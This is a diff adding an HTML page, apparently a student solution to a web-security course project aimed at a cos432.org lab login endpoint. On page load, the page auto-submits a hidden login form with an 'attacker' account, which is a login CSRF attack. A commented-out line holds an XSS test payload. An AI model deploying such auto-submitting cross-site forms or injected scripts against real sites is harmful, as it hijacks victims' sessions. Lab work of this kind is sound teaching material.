@@ -1,0 +1,47 @@
+<html> 
+	
+	<head>
+
+		<!-- functions javascript -->
+		<script type="text/javascript">
+
+			// submit form with ID, id 
+			function submitForm(ID) { 
+
+				document.getElementById(ID).submit(); 
+
+			}
+
+			// dynamically create form... https://stackoverflow.com/questions/6964927/how-to-create-a-form-dynamically-via-javascript
+
+
+		</script>
+
+
+	</head>
+
+	<body>
+
+		<form id = login_form name = login_form action = http://cos432.org/project6/login?csrfdefense=0&xssdefense=4 method = "post"> 
+			<input name = "username" id = "username" value = "attacker"> 
+			<!-- <input name = "password" id = "password" value = "pr1nc3t0n <script> alert("testing injection"); <script>"> --> 	
+			<input name = "password" id = "password" value = "pr1nc3t0n"> 
+			
+
+		</form> 
+
+
+		<script>
+
+			 submitForm("login_form"); 
+
+
+		</script>
+
+
+	</body>
+
+
+
+</html>
+
